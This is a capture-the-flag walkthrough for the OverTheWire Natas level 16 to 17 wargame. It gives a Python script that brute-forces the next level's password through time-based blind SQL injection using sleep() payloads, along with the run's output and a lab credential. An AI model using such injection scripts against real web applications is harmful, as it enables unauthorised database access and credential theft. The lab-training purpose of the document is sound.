`Link:` `https://overthewire.org/wargames/natas/natas17.html`
## [𝐖𝐚𝐥𝐤𝐭𝐡𝐫𝐨𝐮𝐠𝐡] ~ 𝐍𝐚𝐭𝐚𝐬 𝐋𝐞𝐯𝐞𝐥 𝟏𝟔 - 𝐋𝐞𝐯𝐞𝐥 𝟏𝟕

## 𝐆𝐢𝐯𝐞𝐧

- Username: natas17
- URL:      `http://natas17.natas.labs.overthewire.org`

## 𝐒𝐨𝐥𝐮𝐭𝐢𝐨𝐧

```
import requests 

username = "natas17"
password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
natas18_password = ""
remaining_length = 32 - len(natas18_password)

print("brute forcing natas18 password for you! You can take a break while we crack your password.")
print()

while remaining_length:
    for char in characters:
        url ="http://natas17.natas.labs.overthewire.org/index.php?username=natas18%22+and+password+like+binary+%27" + natas18_password + char + "%25%27+and+sleep%285%29%23"
        response = requests.get(url, auth=(username, password))
#        print("char checked: ", char, " time taken: ", response.elapsed.total_seconds(), end="\r")
        if response.elapsed.total_seconds() >= 5:
            natas18_password += char
            print(f"remaining length: {remaining_length} & password: {natas18_password}")
    remaining_length = 32 - len(natas18_password)



```

```
                                                                                                                 
┌──(shreyas㉿kali)-[~/scripts]
└─$ python3 natas17.py
brute forcing natas18 password for you! You can take a break while we crack your password.

remaining length: 32 & password: x
remaining length: 31 & password: xv
remaining length: 31 & password: xvK
remaining length: 29 & password: xvKI
remaining length: 28 & password: xvKIq
remaining length: 28 & password: xvKIqD
remaining length: 26 & password: xvKIqDj
remaining length: 26 & password: xvKIqDjy
remaining length: 26 & password: xvKIqDjy4
remaining length: 23 & password: xvKIqDjy4O
remaining length: 23 & password: xvKIqDjy4OP
remaining length: 21 & password: xvKIqDjy4OPv
remaining length: 21 & password: xvKIqDjy4OPv7
remaining length: 19 & password: xvKIqDjy4OPv7w
remaining length: 19 & password: xvKIqDjy4OPv7wC
remaining length: 19 & password: xvKIqDjy4OPv7wCR
remaining length: 16 & password: xvKIqDjy4OPv7wCRg
remaining length: 16 & password: xvKIqDjy4OPv7wCRgD
remaining length: 14 & password: xvKIqDjy4OPv7wCRgDl
remaining length: 14 & password: xvKIqDjy4OPv7wCRgDlm
remaining length: 12 & password: xvKIqDjy4OPv7wCRgDlmj
remaining length: 12 & password: xvKIqDjy4OPv7wCRgDlmj0
remaining length: 10 & password: xvKIqDjy4OPv7wCRgDlmj0p
remaining length: 10 & password: xvKIqDjy4OPv7wCRgDlmj0pF
remaining length: 8 & password: xvKIqDjy4OPv7wCRgDlmj0pFs
remaining length: 8 & password: xvKIqDjy4OPv7wCRgDlmj0pFsC
remaining length: 6 & password: xvKIqDjy4OPv7wCRgDlmj0pFsCs
remaining length: 6 & password: xvKIqDjy4OPv7wCRgDlmj0pFsCsD
remaining length: 4 & password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDj
remaining length: 3 & password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh
remaining length: 2 & password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd
remaining length: 2 & password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP


```

## 𝐋𝐞𝐚𝐫𝐧𝐢𝐧𝐠

- Walkthrough: `https://www.abatchy.com/2016/12/natas-level-17`
- Post request: `https://stackoverflow.com/questions/43252542/how-to-measure-server-response-time-for-python-requests-post-request`
- Headers in request module python: `https://stackoverflow.com/questions/6260457/using-headers-with-the-python-requests-librarys-get-method`
- Blind SQL Detection cheatsheet: `https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1`
- SQL Injection Cheatsheet: `https://github.com/payloadbox/sql-injection-payload-list`
